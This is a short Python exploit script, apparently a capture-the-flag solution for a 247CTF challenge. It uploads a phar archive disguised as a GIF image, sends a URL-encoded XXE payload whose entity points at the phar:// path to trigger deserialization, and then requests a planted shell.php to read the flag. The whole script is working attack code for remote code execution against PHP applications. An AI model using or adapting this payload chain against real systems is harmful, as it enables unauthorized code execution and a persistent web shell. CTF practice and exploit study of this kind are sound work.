#!/usr/bin/python3

# William Moody
# 10.04.2021

import requests
import urllib
import subprocess
import re
import sys

if len(sys.argv) != 2:
    print("Usage: %s RHOST" % sys.argv[0])
    sys.exit(-1)

RHOST = sys.argv[1]

print("[*] Generating phar/image...")
tmp = subprocess.check_output(["php","generatePhar.php"])

print("[*] Uploading Phar/image...")
phar_img = open("poc.phar","rb").read()
f = {"image":("poc.gif", phar_img, "image/gif")}
r = requests.post('http://%s'%RHOST,
    files=f)

print("[*] POST'ing XML...")
payload = urllib.parse.quote('<!DOCTYPE foo [<!ELEMENT foo ANY>'+\
    '<!ENTITY % xxe SYSTEM "phar:///home/bill/Pen/ctf/247ctf/web/phar_rce/images/poc.gif">%xxe;]><message><to></to><from></from>'+\
    '<title></title><body>F</body></message>')
r = requests.post('http://%s'%RHOST,
    data='message='+payload,
    headers={'Content-Type':'application/x-www-form-urlencoded'}
)

print("[*] Removing phar/image...")
subprocess.Popen(["rm","poc.phar"])

r = requests.get("http://%s/images/shell.php" % RHOST)
print("[*] Retrieving flag...")
print("    -- "+re.search(r"247CTF\{[0-9a-f]{32}\}",r.text)[0])